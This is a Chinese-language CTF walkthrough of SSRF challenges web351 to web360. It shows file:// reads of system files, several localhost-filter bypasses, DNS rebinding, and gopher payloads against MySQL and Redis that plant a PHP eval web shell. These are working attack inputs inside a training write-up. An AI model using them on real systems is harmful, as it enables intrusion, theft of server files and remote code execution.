# web351

首先代码审计，简简单单的使用php的curl，发现没有过滤，尝试读取本地文件

```
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

post数据`url=file:///etc/passwd`，有回显，从Burp抓包信息我看到了是nginx尝试读取nginx的配置文件

```
url=file:///etc/nginx/nginx.conf
daemon off;

worker_processes  auto;

error_log  /var/log/nginx/error.log warn;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        root         /var/www/html;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location / {
            try_files $uri  $uri/ /index.php?$args;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }

    }
}
```

没啥太多关键信息，主要是说了根目录，然后还发现这里有fastcgi！！！意味着我们可以通过gopher协议打fastcgi，我测试了ok的成功了，但是我们这里还是讲以下预期解

采用file协议读取flag.php

```
url=file:///var/www/html/flag.php
```

F12查看注释获取flag

```
<?php
$flag="flag{15a45540-97e2-47d8-a505-2cd9bac4ea94}";
if($_SERVER['REMOTE_ADDR']=='127.0.0.1'){
		echo $flag;
}
else{
		die("非本地用户禁止访问");
}
?>
```



# web352-353

进制绕过,这里有个在线转换网站

https://tool.520101.com/wangluo/jinzhizhuanhuan/

然后post

```
url=http://2130706433/flag.php
```

其他更改 IP 地址写法也行

```
十六进制
url=http://0x7F.0.0.1/flag.php
八进制
url=http://0177.0.0.1/flag.php
10 进制整数格式
url=http://2130706433/flag.php
16 进制整数格式，还是上面那个网站转换记得前缀0x
url=http://0x7F000001/flag.php
还有一种特殊的省略模式
127.0.0.1写成127.1
用CIDR绕过localhost
url=http://127.127.127.127/flag.php
还有很多方式不想多写了
url=http://0/flag.php
url=http://0.0.0.0/flag.php
```

# web354

DNS-Rebinding攻击绕过

```
url=http://r.xxxzc8.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r
```

302跳转绕过也行，在自己的网站主页加上这个

```
<?php
header("Location:http://127.0.0.1/flag.php");
```

或者说群主说我丧心病狂的方式

```
我自己的域名A记录设为了127.0.0.1
```

或者有个现成的A记录是127.0.0.1的网站

```
url=http://sudo.cc/flag.php
```

# web355

设置了$host<5的限制，随便来个利用127.0.0.1=127.1刚好是5位

```
url=http://127.1/flag.php
```

# web356

更绝了限制$host<3，老规矩

```
url=http://0/flag.php
```

# web357

关键代码，不能是一些私有地址

```
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}

```

- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
- FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

用web354说过的DNS-Rebinding与302跳转即可解题



# web358

限制是这个

```
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

blackhat议题加上url解析特性php的curl默认是@后面的部分加上?url解析的时候会把他当成url解析的get请求参数

```
url=http://ctf.@127.0.0.1/flag.php?.show
```

# web359

使用工具gopherus生成即可，[工具地址](https://github.com/tarunkant/Gopherus)

```
Give MySQL username: root                                                                                                                                  
Give query to execute: select '<?php eval($_POST[pass]); ?>' INTO OUTFILE '/var/www/html/2.php';
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

然后注意

```
这部分url需要特殊字编码，curl会默认解码一次
%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

# web360

没啥好说的gopher打redis

```
url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bpass%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

然后访问shell.php，里面的内容是这个

```
<?php eval($_POST[pass]); ?>
```

